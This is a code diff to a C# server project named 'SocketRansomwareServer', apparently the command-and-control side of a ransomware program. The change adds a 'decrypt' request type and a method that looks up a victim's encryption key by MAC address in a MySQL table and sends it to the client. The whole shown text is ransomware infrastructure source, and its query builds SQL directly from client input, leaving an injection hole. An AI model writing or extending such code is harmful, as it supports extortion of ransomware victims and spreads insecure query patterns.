@@ -77,6 +77,7 @@ namespace SocketRansomwareServer
                         string str = Encoding.Default.GetString(bytes).Trim('\0');
                         string[] request = str.Split(';');
                         if (request[0] == "mac") CheckDB(request[1]);
+                        else if (request[0] == "decrypt") SendDecryptKey(request[1]);
                     }
                     catch (Exception e)
                     {
@@ -173,6 +174,21 @@ namespace SocketRansomwareServer
 
                 }
 
+            }
+
+            private void SendDecryptKey(string mac)
+            {
+                string query = string.Format("select `key` from client where mac = '{0}'", mac);
+                MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
+                MySqlDataReader table = command.ExecuteReader();
+
+                if(table.HasRows)
+                {
+                    table.Read();
+                    string key = "key;" + table.GetString(0);
+                    SendDataClient(key);
+                }
+                table.Close();
             }
 
             //클라이언트로 데이터 전송
